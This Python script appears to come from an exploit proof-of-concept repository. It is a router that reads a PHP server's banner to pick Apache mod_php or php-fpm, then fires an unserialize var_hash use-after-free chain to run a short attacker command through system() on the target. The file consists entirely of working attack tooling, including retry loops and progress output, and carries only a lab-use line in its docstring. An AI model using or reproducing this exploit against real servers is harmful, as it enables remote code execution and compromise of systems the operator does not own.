#!/usr/bin/env python3
# INDEX: var_hash-uaf rce SAPI router (apache|fpm) | both | pure | serialize+unserialize | build
"""SAPI router for the unserialize var_hash UAF -> offset-free remote RCE.
CVE-2026-109618 / CVE-2026-109619.

Reads the Server banner and drives the matching proven chain read-only: Apache
mod_php resolves over libphp.so (universal_remote_rce, 8.5.x); php-fpm leaks the
PIE base write-free, then runs the same offset-free resolve+fire
(fpm_fullchain_rce, 8.5.11). An undetermined banner stops rather than guessing.
Needs an unserialize()+echo-serialize sink. Pure stdlib, python3 -I safe.
Lab/analysis use only.
"""
from __future__ import annotations

import importlib.util
import os
import sys
from urllib.parse import urlsplit

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)
from common.http_urllib import http_full  # noqa: E402

CMD_MAX = 14  # the forged GC-header holds at most 14 command bytes


def _load(name, relpath):
    """Import a committed poc module read-only (private, isolated instance)."""
    path = os.path.join(_POC_ROOT, relpath)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def detect_sapi(url):
    """'apache' | 'fpm' from the Server banner (nginx front or an X-Powered-By
    PHP with no Apache banner -> fpm), or None if undetermined. Same rule as
    php2shell_driver.fingerprint_target. Returns (sapi, server, powered)."""
    try:
        _s, h, _b = http_full(url)
    except Exception:
        return None, "", ""
    hl = {k.lower(): (v or "") for k, v in (h or {}).items()}
    server, powered = hl.get("server", ""), hl.get("x-powered-by", "")
    srv = server.lower()
    if "apache" in srv:
        return "apache", server, powered
    if "nginx" in srv or (powered and "apache" not in srv):
        return "fpm", server, powered
    return None, server, powered


def _run_apache(host, port, path, cmd, attempts):
    """Apache mod_php route: by-name resolve over libphp.so, forged stdClass
    destructor = system()."""
    rce = _load("universal_remote_rce", "chains/universal_remote_rce.py")
    print(f"[remote-rce] apache route: {host}:{port}{path} cmd={cmd!r} "
          f"attempts={attempts}")
    for a in range(1, attempts + 1):
        print(f"[remote-rce] === apache attempt {a}/{attempts} (R-1 wants a fresh "
              f"worker; ~1600 req/attempt) ===")
        try:
            ok = rce.run_chain(host, port, path, cmd)
        except Exception as e:
            print(f"[remote-rce] chain error: {e!r}")
            ok = False
        if ok:
            print(f"[remote-rce] fire delivered on attempt {a}; the worker SIGSEGVs "
                  f"after system() returns, so verify the marker out-of-band.")
            return {"ok": True, "stage": "fire", "sapi": "apache", "attempt": a}
    return {"ok": False, "stage": "exhausted", "sapi": "apache"}


def _run_fpm(host, port, path, cmd, attempts):
    """php-fpm route: write-free remote binbase+chunk leak feeds the offset-free
    UAF->RCE driver (no /proc, no local seed). Single-build: 8.5.11-fpm."""
    fc = _load("fpm_fullchain_rce", "chains/fpm_fullchain_rce.py")
    print(f"[remote-rce] fpm route: {host}:{port}{path} cmd={cmd!r} "
          f"attempts={attempts}")
    for a in range(1, attempts + 1):
        print(f"[remote-rce] === fpm attempt {a}/{attempts} (remote binbase leak "
              f"-> UAF -> RCE) ===")
        try:
            r = fc.full_chain(host, port, path, cmd, attempts=6, verbose=True)
        except Exception as e:
            print(f"[remote-rce] chain error: {e!r}")
            r = {"stage": "error", "error": repr(e)}
        if r.get("stage") == "fire":
            print(f"[remote-rce] fire delivered on attempt {a} "
                  f"(binbase=0x{r['binbase']:x} chunk=0x{r['chunk']:x}; "
                  f"leak~{r.get('leak_reqs')} + rce={r.get('rce_reqs')} req).")
            if not r.get("ok"):
                print("[remote-rce] echo sink: worker SIGSEGVs after system() runs "
                      "-- system() still ran, verify the marker out-of-band.")
            r.update(sapi="fpm", attempt=a)
            return r
        print(f"[remote-rce] fpm attempt {a} failed at {r.get('stage')}: "
              f"{r.get('error')}")
    return {"ok": False, "stage": "exhausted", "sapi": "fpm"}


def run(url, cmd, sapi="auto", attempts=3):
    """Validate the target, pick the SAPI route (auto reads the Server banner),
    and fire. Returns a result dict; stage is one of fire / exhausted /
    ambiguous / invalid. cmd is str or bytes (<= CMD_MAX bytes)."""
    raw = url if "://" in url else "http://" + url
    u = urlsplit(raw)
    if u.scheme != "http":
        return {"ok": False, "stage": "invalid",
                "error": "http:// only (the chain speaks raw HTTP)"}
    if isinstance(cmd, str):
        cmd = cmd.encode("latin-1")
    if len(cmd) > CMD_MAX:
        return {"ok": False, "stage": "invalid",
                "error": f"command is {len(cmd)} bytes; the forged GC-header holds "
                         f"at most {CMD_MAX} (stage a longer command to a file "
                         f"across several fires)"}
    host, port, path = u.hostname, u.port or 80, u.path or "/remote_app.php"
    if sapi == "auto":
        sapi, server, powered = detect_sapi(raw)
        print(f"[remote-rce] fingerprint Server={server or '(none)'!r} "
              f"X-Powered-By={powered or '(none)'!r} -> SAPI={sapi or 'UNDETERMINED'}")
        if sapi is None:
            return {"ok": False, "stage": "ambiguous",
                    "error": "SAPI undetermined (Server names neither Apache nor "
                             "nginx); re-run with --sapi apache or --sapi fpm"}
    runner = _run_fpm if sapi == "fpm" else _run_apache
    return runner(host, port, path, cmd, attempts)
